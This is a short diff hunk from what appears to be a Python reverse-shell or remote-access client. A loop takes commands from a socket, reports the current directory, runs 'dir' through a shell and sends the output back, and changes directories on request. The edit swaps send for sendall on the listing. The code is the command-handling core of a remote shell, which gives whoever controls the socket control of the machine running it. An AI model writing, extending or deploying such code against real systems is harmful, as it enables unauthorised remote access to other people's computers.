@@ -32,7 +32,7 @@ while True:
         sock.send(os.path.abspath(os.path.curdir).encode())
     elif command == "ls" or command == "dir":
         sock.send("ls3xecuted".encode())
-        sock.send(subprocess.run("dir", shell=True, stdout=subprocess.PIPE, text=True).stdout.encode())
+        sock.sendall(subprocess.run("dir", shell=True, stdout=subprocess.PIPE, text=True).stdout.encode())
     elif command[:3] == "cd ":
         try:
             os.chdir(command[3:])
